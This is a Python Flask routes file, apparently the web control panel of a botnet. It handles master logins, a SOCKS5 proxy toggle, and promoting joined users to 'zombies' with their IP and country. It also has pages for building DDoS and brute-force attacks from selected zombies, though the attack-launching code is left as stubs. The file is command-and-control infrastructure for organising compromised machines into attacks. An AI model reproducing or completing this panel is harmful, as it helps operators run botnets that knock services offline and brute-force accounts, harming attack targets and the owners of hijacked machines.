#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

from app import app
from flask import render_template, redirect, url_for, request, send_from_directory, jsonify, escape

import os, json
from datetime import datetime, timedelta
from functools import wraps

from app import config, logger, zession, buffer, proxy

from app.modules import create_data, read_data, update_data, delete_data


def merge_date_time_values(date_value, time_value):
    if date_value is None:
        date_value = ''
    if time_value is None:
        time_value = ''
    return ((date_value + ' ' + time_value).rstrip()).lstrip()


def filter_data_by_inputs(request, data_type, filter=None):
    if filter is None:
        filter = {}
    if (request.method == 'POST') and ('btn-filter' in request.form):
        filter['by_username'] = escape(request.form.get('username'))
        filter['by_os'] = request.form.get('os_filter')
        filter['by_datetime_bef'] = merge_date_time_values(request.form.get('date_bef_filter'), request.form.get('time_bef_filter'))
        filter['by_datetime_aft'] = merge_date_time_values(request.form.get('date_aft_filter'), request.form.get('time_aft_filter'))
    return read_data(data_type, filter)


# login requirements
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        #logger.log(zession, 'DEBUG')
        if zession.token.jwt == '':
            return redirect(url_for('not_authorized'))
        else:
            zession.check_for_refresh()
        return f(*args, **kwargs)
    return decorated_function

# after every request
@app.after_request
def after_request_func(response):
    logger.log('section: {}'.format(zession.current_section), 'INFO')
    logger.log('request: {}'.format(request), 'DEBUG')
    logger.log('form: {}'.format(request.form), 'DEBUG')
    return response


# @app.route('/create_proxy_popup.js')
# def create_proxy_popup():
#     return render_template('objects/dynamic/create_popups.js', data_type='proxy', window_type='popup')

@app.route('/', methods=['GET', 'POST'])
@app.route('/index/', methods=['GET', 'POST'])
@app.route('/login/', methods=['GET', 'POST'])
def login():
    zession.current_section = 'login'
    error = None
    # print(zession)
    if zession.token.jwt:
        return redirect(url_for("dashboard"))
    if request.method == 'POST':
        hostname = escape(request.form.get('hostname'))
        username = escape(request.form.get('username'))
        pswd = escape(request.form.get('pswd'))
        if zession.login(username, pswd, hostname):
            return redirect(url_for("game"))
        else:
            error = zession.token.error
    return render_template("pages/login/login.html", error=error, zession=zession)


@app.route('/ajax/get-actual-ip', methods=['POST'])
#@login_required
def get_actual_ip():
    #return jsonify({'text': proxy.get_actual_ip(request.form['text'])})
    proxy.get_actual_ip()
    flag = render_template('objects/dynamic/cc_flag.html', country_code=proxy.country)
    return jsonify({'ip': proxy.current_ip, 'country': proxy.country, 'flag': flag})


@app.route('/ajax/toggle-proxy', methods=['POST'])
def toggle_proxy():
    # logger.log('ajax data received: ', 'DEBUG')
    # logger.log('request.form.host: '.format(request.form.get('host')), 'DEBUG')
    # logger.log('request.form.port: '.format(request.form.get('port')), 'DEBUG')
    if proxy.host:
        proxy.remove()
        enabled = 'false'
        logger.log('socks5 proxy session {}:{} removed'.format(proxy.host, proxy.port), 'INFO')
    else:
        proxy.get_socks5_session(request.form.get('host'), int(request.form.get('port')))
        enabled = 'true'
        logger.log('socks5 proxy session {}:{} created'.format(proxy.host, proxy.port), 'INFO')
    return jsonify({'enabled': enabled})


@app.route('/ajax/is-proxy-enabled', methods=['POST'])
def is_proxy_enabled():
    host = port = ''
    enabled = 'false'
    if proxy.host:
        enabled = 'true'
        host = proxy.host
        port = str(proxy.port)
    return jsonify({'enabled': enabled, 'host': host, 'port': port})


@app.route('/not-authorized/', methods=['GET', 'POST'])
def not_authorized():
    return render_template("pages/errors/not-authorized.html")


@app.route('/logout/', methods=['GET', 'POST'])
@login_required
def logout():
    zession.logout()
    return redirect(url_for("login"))

@app.route('/game/', methods=['GET', 'POST'])
@login_required
def game():
    return render_template("pages/login/game.html", zession=zession)


@app.route('/export-json/<data_type>/', methods=['POST'])
@login_required
def export_json(data_type):
    selected_data_ids = request.form.getlist(data_type + '_checked')
    #logger.log('selected_data_ids: {}'.format(selected_data_ids), 'DEBUG')
    data = buffer.data[data_type]
    #logger.log('data: {}'.format(data), 'DEBUG')
    column_id = 'id'
    if (data_type == 'users') or (data_type == 'zombies') or (data_type == 'masters'):
        column_id = 'username'
    selected_data = [row for row in data if row[column_id] in selected_data_ids]
    #logger.log('data_to_export: {}'.format(selected_data), 'DEBUG')

    filename = (datetime.now()).strftime('%Y%m%d_%H%M%S') + '-' + data_type + '.json'
    try:
        with open(config.TEMP_DIR + filename, 'w') as temp:
            json.dump(selected_data, temp, indent=4)
        logger.log('tempfile {} created'.format(config.TEMP_DIR + filename), 'DEBUG')
        # here returns the temp file to client
        return send_from_directory(config.TEMP_DIR, filename, as_attachment=True)
    finally:
        buffer.clear(data_type)
        logger.log('{} buffer cleared'.format(data_type), 'DEBUG')
        os.remove(config.TEMP_DIR + filename)
        logger.log('tempfile {} deleted'.format(config.TEMP_DIR + filename), 'DEBUG')


@app.route('/dashboard/', methods=['GET', 'POST'])
@login_required
def dashboard():
    return render_template("pages/dashboard/base_dashboard.html", zession=zession)


@app.route('/access-logs/', methods=['GET', 'POST'])
@login_required
def access_logs():
    zession.current_section = 'logs'

    # filter data
    data = {}
    filter_error = None
    # first request get only last hour access logs
    default_filter = {
        'by_datetime_aft': (datetime.now() - timedelta(hours = 1)).strftime('%Y-%m-%d %H:%M:%S')
    }
    if (request.method == 'GET') or ('btn-filter' in request.form):
        data = filter_data_by_inputs(request, 'access_logs', default_filter)
        if data:
            buffer.store('access-logs', data)
        else:
            filter_error = '0 logs found'

    return render_template("pages/dashboard/logs/access-logs.html", zession=zession, filter_error=filter_error, data=data)


@app.route('/zombies/', methods=['GET', 'POST'])
@login_required
def zombies():
    zession.current_section = 'members'

    zombies_created = []
    zombies_deleted = []
    users_deleted = []

    # filter data
    data = {}
    filter_error = None
    data = filter_data_by_inputs(request, 'zombies')
    if data:
        buffer.store('zombies', data)
    else:
        filter_error = '0 zombies found'

    # get join requests
    zombie_requests = read_data('users', {"not_in": "zombies,masters"})
    if zombie_requests:
        buffer.store('users', zombie_requests)

    # create zombies
    if (request.method == 'POST') and (('btn-create-zombies' in request.form) and zombie_requests):
        #logger.log('request.form: '.format(request.form), 'DEBUG')
        selected_users = request.form.getlist('users_checked')
        #logger.log('selected_users: '.format(selected_users), 'DEBUG')
        for user in zombie_requests:
            if user['username'] in selected_users:
                # create zombie
                zombie_data = {
                    'username': user['username'],
                    'current_public_ip': user['public_ip'],
                    'current_country': user['country']
                }
                if create_data('zombie', zombie_data):
                    zombies_created.append(user['username'])

    # delete zombies
    elif (request.method == 'POST') and ('btn-delete-zombies' in request.form):
        selected_users = request.form.getlist('zombies_checked')
        for username in selected_users:
            if delete_data('zombie', username):
                zombies_deleted.append(username)

    # delete users
    elif (request.method == 'POST') and ('btn-delete-users' in request.form):
        selected_users = request.form.getlist('users_checked')
        for username in selected_users:
            if delete_data('user', username):
                users_deleted.append(username)

    return render_template("pages/dashboard/members/zombies.html", zession=zession, filter_error=filter_error, data=data,
                           zombie_requests=zombie_requests, zombies_created=zombies_created, zombies_deleted=zombies_deleted,
                           users_deleted=users_deleted)


@app.route('/masters/', methods=['GET', 'POST'])
@login_required
def masters():

    zession.current_section = 'members'
    data = {}
    filter_error = update_error = None
    edit_profile = False

    # launch edit profile window
    if (request.method) == 'POST' and ('btn-launcher' in request.form):
        edit_profile = True
        #return redirect(url_for('edit_profile'))

    # update profile
    elif (request.method) == 'POST' and not ('btn-launcher' in request.form or 'btn-filter' in request.form):
        # update master password
        if ('pswd-btn' in request.form):
            if not request.form.get('pswd'):
                update_error = 'introduce the new password'
            else:
                response = update_data('user', {'username': zession.username, 'pswd': request.form.get('pswd')})
                if response and ('jwt' in response):
                    zession.jwt = response['jwt']
                    update_error = 'password updated'

        # update master public key
        elif ('public_key_btn' in request.form):
            if not request.form.get('public_key'):
                update_error = 'introduce the new public_key'
            # ...

    # filter data
    if (request.method) == 'GET' or ('btn-filter' in request.form):
        data = filter_data_by_inputs(request, 'masters')
        if not data:
            filter_error = '0 masters found'

    return render_template("pages/dashboard/members/masters.html", zession=zession, filter_error=filter_error, update_error=update_error, data=data, edit_profile=edit_profile)


@app.route('/ddos-attacks/', methods=['GET', 'POST'])
@login_required
def ddos_attacks():
    zession.current_section = 'tools'
    data = {}
    selected_zombies = []
    filter_error = create_error = None
    create_attack = zombies_selector_popup = False

    #logger.log('request.form: {}'.format(request.form),'DEBUG')
    #logger.log('buffer.data: {}'.format(buffer.data), 'DEBUG')

    # filter data
    if (request.method == 'POST') and ('btn-filter' in request.form):
        logger.log('filtered data requested', 'INFO')
        data = filter_data_by_inputs(request, 'ddos-attacks')
        #logger.log('data received: {}'.format(data), 'DEBUG')
        if not data:
            filter_error = '0 attacks found'

    # launch ddos attack creator
    elif (request.method == 'POST') and ('btn-launcher' in request.form):
        logger.log('create attack requested', 'INFO')
        data = filter_data_by_inputs(request, 'zombies')
        logger.log('data received: {}'.format(data), 'DEBUG')
        filter_error = ''
        create_attack = True

    # create new ddos attack
    if (request.method == 'POST') and ('btn-create-ddos-attack' in request.form):
        pass
        logger.log('creating ddos attack', 'WARNING')
        # ...
        logger.log('clearing buffer', 'WARNING')

    return render_template("pages/dashboard/tools/ddos-attacks.html", zession=zession, buffer=buffer, filter_error=filter_error, create_error=create_error,
                           data=data, create_attack=create_attack, zombies_selector_popup=zombies_selector_popup, selected_zombies=selected_zombies)


@app.route('/brute-attacks/', methods=['GET', 'POST'])
@login_required
def brute_attacks():
    zession.current_section = 'tools'
    data = {}
    filter_error = create_error = None
    create_attack = False

    # filter data
    if (request.method == 'POST') and ('btn-filter' in request.form):
        data = filter_data_by_inputs(request, 'brute-attacks')
        if not data:
            filter_error = '0 attacks found'

    # launch ddos attack creator
    if (request.method == 'POST') and ('btn-launcher' in request.form):
        data = filter_data_by_inputs(request, 'zombies')
        filter_error = ''
        create_attack = True

    # create new ddos attack
    if (request.method == 'POST') and ('btn-ddos-creator' in request.form):
        print(request.form)
        pass
        # ...
        # data = filter_data_by_input(request, 'zombies')
        # return render_template("pages/dashboard/tools/ddos-creator.html", zession=zession, create_error=error, data=data)

    return render_template("pages/dashboard/tools/brute-attacks.html", zession=zession, filter_error=filter_error, create_error=create_error, data=data, create_attack=create_attack)